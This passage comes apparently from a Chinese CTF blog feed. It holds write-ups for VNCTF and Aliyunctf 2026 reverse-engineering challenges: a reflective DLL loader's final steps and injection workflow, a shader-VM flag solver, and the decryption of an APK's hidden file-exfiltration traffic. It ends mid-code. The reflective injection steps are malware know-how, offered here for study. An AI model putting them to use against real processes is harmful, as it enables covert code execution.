class="keyword">if</span> (peSections[i]-&gt;Characteristics &amp; IMAGE_SCN_MEM_EXECUTE &amp;&amp; peSections[i]-&gt;Characteristics &amp; IMAGE_SCN_MEM_READ) &#123; <span class="comment">//executeread</span></span><br><span class="line"></span><br><span class="line">        dwProtection = PAGE_EXECUTE_READ;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (peSections[i]-&gt;Characteristics &amp; IMAGE_SCN_MEM_EXECUTE &amp;&amp; peSections[i]-&gt;Characteristics &amp; IMAGE_SCN_MEM_READ &amp;&amp; peSections[i]-&gt;Characteristics &amp; IMAGE_SCN_MEM_WRITE) &#123; <span class="comment">//executereadwrite</span></span><br><span class="line"></span><br><span class="line">        dwProtection = PAGE_EXECUTE_READWRITE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!VP((PVOID)(pebase + peSections[i]-&gt;VirtualAddress), peSections[i]-&gt;SizeOfRawData, dwProtection, &amp;dwOldProtection)) &#123;</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="调用-dll-入口点"><a href="#调用-dll-入口点" class="headerlink" title="调用 dll 入口点"></a>调用 dll 入口点</h2><p>最后我们刷新指令缓存，使得我们先前的工作生效，然后返回入口点地址就可以了，然后就会完成C运行库的初始化，执行一系列安全检查并调用dllmain。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">FIC((HANDLE)-1, NULL, 0x00);</span><br><span class="line"></span><br><span class="line">    /*--------------EXECUTE ENTRY POINT--------------*/</span><br><span class="line">    pDllMain = (fnDllMain)(pebase + pImgNtHdrs-&gt;OptionalHeader.AddressOfEntryPoint);</span><br><span class="line">    return pDllMain((HMODULE)pebase, DLL_PROCESS_ATTACH, NULL);</span><br></pre></td></tr></table></figure><h2 id="ReflectiveInject"><a href="#ReflectiveInject" class="headerlink" title="ReflectiveInject"></a>ReflectiveInject</h2><p>在 inject 里面要做的事情主要有一下几步：</p><ol><li><p><strong>下载&#x2F;读取我们的 DLL 字节</strong></p></li><li><p><strong>查找 ReflectiveFunction 的 RAW 地址</strong></p><p>在DLL文件中找到ReflectiveFunction的原始地址。这通常需要解析DLL的PE结构以定位目标函数的地址。</p><p>反射注入的关键在于：把 DLL 原始字节塞进了远程进程的一块内存里，但<strong>系统并不知道那是个模块</strong>，也不会解析导入表&#x2F;重定位&#x2F;节权限等。</p><p>所以必须先定位一个引导入口函数（常叫 ReflectiveLoader &#x2F; ReflectiveFunction）：</p><ul><li>这个函数的作用不是业务逻辑，而是<strong>在目标进程里把自己加载成一个真正可运行的模块</strong>。</li><li>因为DLL 还没被正常加载，所以没法靠常规方式（比如 GetProcAddress(模块句柄, 函数名)）去找它。</li><li>因此只能从 DLL 文件的 <strong>PE 结构</strong>里定位它在文件中的位置（RAW&#x2F;文件偏移），然后换算成将来写进远程内存后的对应地址。</li></ul><p>可以把它想象成：</p><blockquote><p>把一本书（DLL字节）搬进别人家（远程进程），但书还没拆封（没加载）。得先找到拆封说明书的那一页（ReflectiveLoader），然后让别人从那一页开始读，才能把书摊开用。</p></blockquote></li><li><p><strong>在远程进程中分配内存</strong>：在目标远程进程中分配足够的内存，以容纳即将写入的DLL字节。</p></li><li><p><strong>在远程内存位置写入 RAW 字节</strong>：将下载或读取到的DLL字节写入分配好的远程内存中。</p></li><li><p><strong>创建一个将运行“ReflectiveLoader”函数的远程线程</strong>:在远程进程中创建一个线程，以运行ReflectiveLoader函数，这样DLL就可以在目标进程中进行自我加载。</p><p>在目标进程里，必须有一段代码开始执行，去完成自加载那一整套动作。ReflectiveLoader 就相当于一个<strong>微型PE加载器</strong>，它运行后通常会：</p><ol><li>在目标进程里为“最终映像”再找&#x2F;准备一块合适的内存</li><li>把各节按内存布局重新安放</li><li>修复重定位 + 解析导入</li><li>设置节权限</li><li>调用入口初始化（DLLMain &#x2F; TLS 等）</li><li>然后返回&#x2F;自清理（不同实现不同）</li></ol></li></ol><p><a href="https://xz.aliyun.com/news/12996">PEB及其武器化-先知社区</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;VNCTF2026-Re-复现&quot;&gt;&lt;a href=&quot;#VNCTF2026-Re-复现&quot; class=&quot;headerlink&quot; title=&quot;VNCTF2026 Re 复现&quot;&gt;&lt;/a&gt;VNCTF2026 Re 复现&lt;/h1&gt;&lt;p&gt;做alictf去了 没怎么做 简单看</summary>
      
    
    
    
    <category term="CTF wp" scheme="http://matriy330.github.io/categories/CTF-wp/"/>
    
    
    <category term="wp" scheme="http://matriy330.github.io/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>Aliyunctf 2026 re</title>
    <link href="http://matriy330.github.io/568117e0/"/>
    <id>http://matriy330.github.io/568117e0/</id>
    <published>2026-02-21T16:00:00.000Z</published>
    <updated>2026-02-22T15:25:03.843Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Aliyunctf-2026-re"><a href="#Aliyunctf-2026-re" class="headerlink" title="Aliyunctf 2026 re"></a>Aliyunctf 2026 re</h1><h2 id="license-not-solved"><a href="#license-not-solved" class="headerlink" title="license [not solved]"></a>license [not solved]</h2><p>解到最后一层RSA 不会密码 原来是维纳攻击 忘记了…</p><h2 id="pixelflow"><a href="#pixelflow" class="headerlink" title="pixelflow"></a>pixelflow</h2><p>用Il2cppdumper dump出dump.cs和一些数据</p><p><img src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/803525a0-be47-4e6e-81b2-d29f5751629a.png" alt="image-20260131230209976" title=" =1038x483"></p><p>导入到IDA打开的GameAssembly.dll恢复一些函数名和符号</p><p>同时也在Assembly-Csharp.dll发现了check指向了GameAssembly的地址</p><p>在stringliteral.json里看到了flag头</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;value&quot;</span>: <span class="string">&quot;alictf&#123;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;address&quot;</span>: <span class="string">&quot;0xEBDF38&quot;</span></span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><p><code>Controller__Check_d__18__MoveNext</code></p><p> <img src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/1d6968c6-d9fb-4c47-9581-02ef2c738811.png" title=" =1503x1401"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">这里能看到依次调用 Method_Controller__Check_b__18_0__ / b__18_1__ / b__18_2__ / b__18_3__，其中 b__18_2 被 <span class="keyword">await</span>了<span class="number">3</span>次（对应K0运行<span class="number">3</span> 次）</span><br><span class="line">前后缀/长度校验：Controller.&lt;&lt;Check&gt;b__18_0&gt;d::MoveNext 在 <span class="number">0x1801D63F0</span></span><br><span class="line">这里直接调用 System_String__StartsWith / EndsWith，并引用 StringLiteral_1026（alictf&#123;）和 StringLiteral_4628（&#125;），再 Substring + Length==<span class="number">16</span></span><br><span class="line">上传输入到 TexF：Controller.&lt;&lt;Check&gt;b__18_1&gt;d::MoveNext 在 <span class="number">0x1801D6710</span></span><br><span class="line">K0的Dispatch：Controller.&lt;&lt;Check&gt;b__18_2&gt;d::MoveNext 在 <span class="number">0x1801D6AE0</span>,里面是 UnityEngine_ComputeShader__Dispatch(Shader0, K0, <span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>)</span><br><span class="line">K1 的 Dispatch + 清空 SharedState：Controller.&lt;&lt;Check&gt;b__18_3&gt;d::MoveNext 在 <span class="number">0x1801D6D40</span>,先 ComputeBuffer.SetData 清 <span class="number">0</span>，再 Dispatch(Shader0, K1, <span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>可以得出</p><p>Check(string input) 为 async，做了：</p><ul><li>前缀&#x2F;后缀校验（alictf{ 和 }）</li><li>中间长度 16</li><li>使用 Resources.Load 读取两张纹理 ciTex &#x2F; coTex</li><li>用 compute shader 的三个 kernel（K0&#x2F;K1&#x2F;K2）</li><li>K0 执行 3 次</li><li>K1 判断对错（错则 SharedState&#x3D;1）</li></ul><p>纹理与资源位置，可以用AssetRipper提取所有的资源文件 </p><p><img src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/84fe0b1d-d4a9-4cfb-bf52-093bb6fecc91.png" title=" =1074x168"></p><p>ciTex.png 是 16x1 RGB，R 通道数据：[233,142,138,138,183,231,201,224,184,151,183,75,59,33,211,124]</p><p>coTex.png 是 13x1 RGBA，像素（R,G,B,A）：[(0,1,0,42),(0,2,0,0),(1,0,2,0),(2,0,1,0),(3,0,2,0), (4,0,0,7),(6,0,2,0),(7,2,0,0),(6,1,0,0),(5,2,2,1), (8,2,0,16),(9,0,0,247),(10,0,0,0)]</p><p>可以读出来看看</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">​</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump_ci</span>(<span class="params">path</span>):</span><br><span class="line">  im = Image.<span class="built_in">open</span>(path).convert(<span class="string">&quot;RGB&quot;</span>)</span><br><span class="line">  w,h = im.size</span><br><span class="line">  px = im.load()</span><br><span class="line">  <span class="keyword">return</span> [px[x,<span class="number">0</span>][<span class="number">0</span>] <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(w)]</span><br><span class="line">​</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump_co</span>(<span class="params">path</span>):</span><br><span class="line">  im = Image.<span class="built_in">open</span>(path).convert(<span class="string">&quot;RGBA&quot;</span>)</span><br><span class="line">  w,h = im.size</span><br><span class="line">  px = im.load()</span><br><span class="line">  <span class="keyword">return</span> [px[x,<span class="number">0</span>] <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(w)]</span><br><span class="line">​</span><br><span class="line"><span class="built_in">print</span>(dump_ci(<span class="string">&quot;game_Data/test2/Assemblies/Assets/Texture2D/ciTex.png&quot;</span>))</span><br><span class="line"><span class="built_in">print</span>(dump_co(<span class="string">&quot;game_Data/test2/Assemblies/Assets/Texture2D/coTex.png&quot;</span>))</span><br></pre></td></tr></table></figure><p>game_Data&#x2F;sharedassets*.assets.resS 或 game_Data&#x2F;resources.assets.resS里有dxbc资源文件，做法是扫这些 .resS 文件里的 DXBC 头，然后按 DXBC 结构的长度切块保存，所以第一个切下来的块就命名成 dxbc_0.bin。</p><p>之后用HLSLDecompiler去反编译Dxbc为HLSL</p><p> <img src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/8bbb8a14-a3fb-43cf-83a2-b3d4120b20cd.png" alt="image-20260201160308647" title=" =1389x591"></p><p>但是出了点小问题，只出了asm不过也够用给AI就能梭出来解密脚本了</p><p>K0 的核心行为：读取 coTex 作为程序，对输入 16 字节执行一个 VM；其中 K0 连续执行 3 次。</p><p>推导出的等效算法（核心变换 F）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="number">42</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="number">0.</span><span class="number">.15</span>:</span><br><span class="line">    x = <span class="built_in">input</span>[i]</span><br><span class="line">    x ^= s</span><br><span class="line">    x = rol8(x, i&amp;<span class="number">7</span>)</span><br><span class="line">    x = (x * <span class="number">7</span>) &amp; <span class="number">0xFF</span></span><br><span class="line">    x = (x + i) &amp; <span class="number">0xFF</span></span><br><span class="line">    output[i] = x</span><br><span class="line">    s = (s + x) &amp; <span class="number">0xFF</span></span><br></pre></td></tr></table></figure><p> K1 的判断逻辑：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">CiTex[i] 与 WorkTex[i] 比较：</span><br><span class="line">CiTex[i] == (WorkTex[i] + i) &amp; <span class="number">0xFF</span></span><br><span class="line">任一不符 → SharedState=<span class="number">1</span> → 判错。</span><br></pre></td></tr></table></figure><p>因此需满足：</p><p>WorkTex[i] &#x3D; (CiTex[i] - i) &amp; 0xFF，而 WorkTex 是 F^3(输入)。</p><p>反推输入（3 次逆变换）逆变换（F 的逆）：</p><ul><li>逆乘法：inv7 &#x3D; 183，因为 7*183 ≡ 1 (mod 256)</li><li>逆旋转：ror8(x, i&amp;7)</li></ul><p>exp</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">def <span class="title function_">rol8</span><span class="params">(x, n)</span>:</span><br><span class="line">  n &amp;= <span class="number">7</span></span><br><span class="line">  <span class="keyword">return</span> ((x &lt;&lt; n) | (x &gt;&gt; (<span class="number">8</span>-n))) &amp; <span class="number">0xFF</span></span><br><span class="line">​</span><br><span class="line">def <span class="title function_">ror8</span><span class="params">(x, n)</span>:</span><br><span class="line">  n &amp;= <span class="number">7</span></span><br><span class="line">  <span class="keyword">return</span> ((x &gt;&gt; n) | (x &lt;&lt; (<span class="number">8</span>-n))) &amp; <span class="number">0xFF</span></span><br><span class="line">​</span><br><span class="line">inv7 = <span class="number">183</span></span><br><span class="line">​</span><br><span class="line">def <span class="title function_">F</span><span class="params">(inp)</span>:</span><br><span class="line">  s = <span class="number">42</span></span><br><span class="line">  out = []</span><br><span class="line">  <span class="keyword">for</span> i,x in <span class="title function_">enumerate</span><span class="params">(inp)</span>:</span><br><span class="line">      x ^= <span class="type">s</span></span><br><span class="line">      <span class="variable">x</span> <span class="operator">=</span> rol8(x, i&amp;<span class="number">7</span>)</span><br><span class="line">      x = (x * <span class="number">7</span>) &amp; <span class="number">0xFF</span></span><br><span class="line">      x = (x + i) &amp; <span class="number">0xFF</span></span><br><span class="line">      out.append(x)</span><br><span class="line">      s = (s + x) &amp; <span class="number">0xFF</span></span><br><span class="line">  <span class="keyword">return</span> out</span><br><span class="line">​</span><br><span class="line">def <span class="title function_">Finv</span><span class="params">(out)</span>:</span><br><span class="line">  s = <span class="number">42</span></span><br><span class="line">  inp = []</span><br><span class="line">  <span class="keyword">for</span> i,y in <span class="title function_">enumerate</span><span class="params">(out)</span>:</span><br><span class="line">      x = (y - i) &amp; <span class="number">0xFF</span></span><br><span class="line">      x = (x * inv7) &amp; <span class="number">0xFF</span></span><br><span class="line">      x = ror8(x, i&amp;<span class="number">7</span>)</span><br><span class="line">      x ^= s</span><br><span class="line">      inp.append(x)</span><br><span class="line">      s = (s + y) &amp; <span class="number">0xFF</span></span><br><span class="line">  <span class="keyword">return</span> inp</span><br><span class="line">​</span><br><span class="line">ci = [<span class="number">233</span>,<span class="number">142</span>,<span class="number">138</span>,<span class="number">138</span>,<span class="number">183</span>,<span class="number">231</span>,<span class="number">201</span>,<span class="number">224</span>,<span class="number">184</span>,<span class="number">151</span>,<span class="number">183</span>,<span class="number">75</span>,<span class="number">59</span>,<span class="number">33</span>,<span class="number">211</span>,<span class="number">124</span>]</span><br><span class="line">W = [(b - i) &amp; <span class="number">0xFF</span> <span class="keyword">for</span> i,b in <span class="title function_">enumerate</span><span class="params">(ci)</span>]</span><br><span class="line">​</span><br><span class="line">v = W</span><br><span class="line"><span class="keyword">for</span> _ in <span class="title function_">range</span><span class="params">(<span class="number">3</span>)</span>:  # inverse of <span class="number">3</span> <span class="type">rounds</span></span><br><span class="line">  <span class="variable">v</span> <span class="operator">=</span> Finv(v)</span><br><span class="line">​</span><br><span class="line">print(v)</span><br><span class="line">print(bytes(v))</span><br></pre></td></tr></table></figure><p>运行结果：[53, 104, 97, 100, 101, 114, 86, 77, 95, 82, 101, 112, 51, 97, 116, 33]  </p><p>最终 flag：alictf{5haderVM_Rep3at!}</p><h2 id="Thief"><a href="#Thief" class="headerlink" title="Thief"></a>Thief</h2><p>APK 源码本身没什么有效信息，真正逻辑藏在 app&#x2F;src&#x2F;main&#x2F;res&#x2F;mipmap-hdpi&#x2F;*.webp（实际上是 .class）</p><p>这些字节码会扫描上级目录 .java 文件，每 3 个为一组打包，加密后发到 localhost:8889（pcap 里就是这些 payload）。</p><p>每个 batch payload 结构：</p><ul><li>\x89ali 魔数</li><li>batch index (LE int)</li><li>RSA 加密后的 8 字节 key</li><li>文件数、文件名长度、文件名(异或0xE9)、offsets</li><li>加密数据 blob</li></ul><p>压缩算法是自定义 LZRR</p><p>加密算法有两种：</p><ul><li>algo3（奇数 batch）：不依赖 key</li><li>algo2（偶数 batch）：是线性仿射 keystream XOR，依赖 key</li></ul><p>解析 pcap 拿密文stream0&#x2F;1&#x2F;2 都在 dump.pcapng，dump.pcapng 里有程序发往 127.0.0.1:8889 的 TCP 流。每个流的 payload 结构是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[0x89 &#x27;a&#x27; &#x27;l&#x27; &#x27;i&#x27;]        // magic</span><br><span class="line">[batchIndex LE int]</span><br><span class="line">[rsaEncryptedKey 256 bytes]</span><br><span class="line">[fileCount LE int]</span><br><span class="line">[fileNameLen LE int][fileNameXorE9][offset LE int] * N</span><br><span class="line">[encrypted data blob]     // 这部分就是 streamX_encdata.bin</span><br></pre></td></tr></table></figure><p>解析了 payload 头后，把最后的加密 blob单独保存为：</p><ul><li>stream0_encdata.bin（batch1）</li><li>stream1_encdata.bin（batch2）</li><li>stream2_encdata.bin（batch3）</li></ul><p>解 batch1&#x2F;3（algo3）algo3 不依赖 key → 直接用 Runner.encrypt 解出密文 → LZRR 解压 → 得到Image1Part1&#x2F;3&#x2F;5&#x2F;6.java</p><blockquote><p>来自隐藏字节码 i.l.l1I 的私有方法 Il1(byte[],byte[],int)。</p><p>在 javap -c -private i.l.l1I 里可以看到：</p><ul><li>方法开头 lookupswitch 对 batch % 2 分支</li><li>分支里有两段超长 Base64 字符串</li><li>Base64 解出来的字节数组会传给 Runner.encrypt</li></ul><p>为了区分叫它们：</p><ul><li>algo2：用于偶数 batch（batch2）</li><li>algo3：用于奇数 batch（batch1&#x2F;3）</li></ul><p>javap -classpath extracted_classes -c -private i.l.l1I | sed -n ‘356,520p’</p><ul><li>algo3：不同 key 结果相同 → 不依赖 key</li><li>algo2：输出随 key 变化 → 依赖 key</li></ul></blockquote><p>LZRR 解压器</p><blockquote><p>i.l.Il1.Il1(byte[]) 生成的压缩数据（每个 .java 文件都会先被压缩成 LZRR），也就是从 stream*_dec.bin 切出来的那一段段文件压缩块</p><p>它解的是LZRR 压缩块→ 输出原始 .java 文件内容</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># lzrr_decompress.py</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rle_decode</span>(<span class="params">data</span>):</span><br><span class="line">  out = <span class="built_in">bytearray</span>()</span><br><span class="line">  i = <span class="number">0</span></span><br><span class="line">  <span class="keyword">while</span> i &lt; <span class="built_in">len</span>(data):</span><br><span class="line">      b = data[i]</span><br><span class="line">      <span class="keyword">if</span> b == <span class="number">0xFF</span>:</span><br><span class="line">          <span class="keyword">if</span> data[i+<span class="number">1</span>] == <span class="number">0xFF</span>:</span><br><span class="line">              out.append(<span class="number">0xFF</span>); i += <span class="number">2</span></span><br><span class="line">          <span class="keyword">else</span>:</span><br><span class="line">              count = data[i+<span class="number">1</span>] + <span class="number">4</span></span><br><span class="line">              val = data[i+<span class="number">2</span>]</span><br><span class="line">              out.extend([val]*count); i += <span class="number">3</span></span><br><span class="line">      <span class="keyword">else</span>:</span><br><span class="line">          out.append(b); i += <span class="number">1</span></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">bytes</span>(out)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">BitReader</span>:</span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, data</span>):</span><br><span class="line">      <span class="variable language_">self</span>.data = data; <span class="variable language_">self</span>.bitpos = <span class="number">0</span></span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">read_bit</span>(<span class="params">self</span>):</span><br><span class="line">      b = <span class="variable language_">self</span>.data[<span class="variable language_">self</span>.bitpos&gt;&gt;<span class="number">3</span>]</span><br><span class="line">      bit = (b &gt;&gt; (<span class="number">7</span>-(<span class="variable language_">self</span>.bitpos &amp; <span class="number">7</span>))) &amp; <span class="number">1</span></span><br><span class="line">      <span class="variable language_">self</span>.bitpos += <span class="number">1</span></span><br><span class="line">      <span class="keyword">return</span> bit</span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">read_bits</span>(<span class="params">self, n</span>):</span><br><span class="line">      v = <span class="number">0</span></span><br><span class="line">      <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(n): v = (v&lt;&lt;<span class="number">1</span>)|<span class="variable language_">self</span>.read_bit()</span><br><span class="line">      <span class="keyword">return</span> v</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lzrr_decompress</span>(<span class="params">blob</span>):</span><br><span class="line">  magic = <span class="built_in">int</span>.from_bytes(blob[<span class="number">0</span>:<span class="number">4</span>],<span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">  <span class="keyword">assert</span> magic == <span class="number">0x4c5a5252</span></span><br><span class="line">  flags = <span class="built_in">int</span>.from_bytes(blob[<span class="number">6</span>:<span class="number">8</span>],<span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">  orig_len = <span class="built_in">int</span>.from_bytes(blob[<span class="number">8</span>:<span class="number">12</span>],<span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">  data = blob[<span class="number">16</span>:]</span><br><span class="line">  <span class="keyword">if</span> flags == <span class="number">15</span>:</span><br><span class="line">      data = rle_decode(data)</span><br><span class="line">  br = BitReader(data)</span><br><span class="line">  out = <span class="built_in">bytearray</span>()</span><br><span class="line">  <span class="keyword">while</span> <span class="built_in">len</span>(out) &lt; orig_len:</span><br><span class="line">      <span class="keyword">if</span> br.read_bit() == <span class="number">0</span>:</span><br><span class="line">          out.append(br.read_bits(<span class="number">8</span>))</span><br><span class="line">      <span class="keyword">else</span>:</span><br><span class="line">          dist = br.read_bits(<span class="number">8</span>) <span class="keyword">if</span> br.read_bit()==<span class="number">0</span> <span class="keyword">else</span> br.read_bits(<span class="number">16</span>)</span><br><span class="line">          <span class="keyword">if</span> br.read_bit()==<span class="number">0</span>:</span><br><span class="line">              l2 = br.read_bits(<span class="number">3</span>)</span><br><span class="line">          <span class="keyword">else</span>:</span><br><span class="line">              l2 = br.read_bits(<span class="number">6</span>)+<span class="number">8</span> <span class="keyword">if</span> br.read_bit()==<span class="number">0</span> <span class="keyword">else</span> br.read_bits(<span class="number">8</span>)</span><br><span class="line">          length = l2 + <span class="number">3</span></span><br><span class="line">          start = <span class="built_in">len</span>(out)-dist</span><br><span class="line">          <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">              out.append(out[start+i])</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">bytes</span>(out)</span><br></pre></td></tr></table></figure><p>batch2 的加密算法（algo2）需要 key。但 key 在 RSA 公钥里，静态解不出来。于是用已知明文（ParticlePhysicsSimulator.java 源码）先压缩成 LZRR，再和密文 XOR 得出 keystream，最终反推出 key</p><p>调用原始压缩器,  直接调用 i.l.Il1.Il1(byte[])：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// CompressIl1.java</span></span><br><span class="line"><span class="keyword">import</span> java.nio.file.*;</span><br><span class="line"><span class="keyword">import</span> i.l.Il1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CompressIl1</span> &#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">      <span class="type">byte</span>[] data = Files.readAllBytes(Paths.get(args[<span class="number">0</span>]));</span><br><span class="line">      <span class="type">byte</span>[] out = Il1.Il1(data);</span><br><span class="line">      Files.write(Paths.get(args[<span class="number">1</span>]), out);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>解 batch2（algo2）algo2 依赖 key。RSA 私钥不知道，因此不能直接还原 key。但 batch2 里的第一个文件是 ParticlePhysicsSimulator.java，它是已知明文</p><p>于是：</p><ul><li>用同样的 LZRR 压缩器生成压缩后明文</li><li>keystream &#x3D; ciphertext XOR plaintext</li><li>发现 keystream 对 key 是线性仿射 → 用 GF(2) 高斯消元解出 8 字节 key</li><li>得到 key：a91b1bb4e8978bda</li></ul><p>生成 keystream</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// DumpKS.java</span></span><br><span class="line"><span class="keyword">import</span> java.nio.file.*;</span><br><span class="line"><span class="keyword">import</span> i.l.Runner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DumpKS</span> &#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">      <span class="type">byte</span>[] algo = Files.readAllBytes(Paths.get(args[<span class="number">0</span>]));</span><br><span class="line">      <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> Integer.parseInt(args[<span class="number">1</span>]);</span><br><span class="line">      <span class="type">byte</span>[] key = hexToBytes(args[<span class="number">2</span>]);</span><br><span class="line">      <span class="type">byte</span>[] data = <span class="keyword">new</span> <span class="title 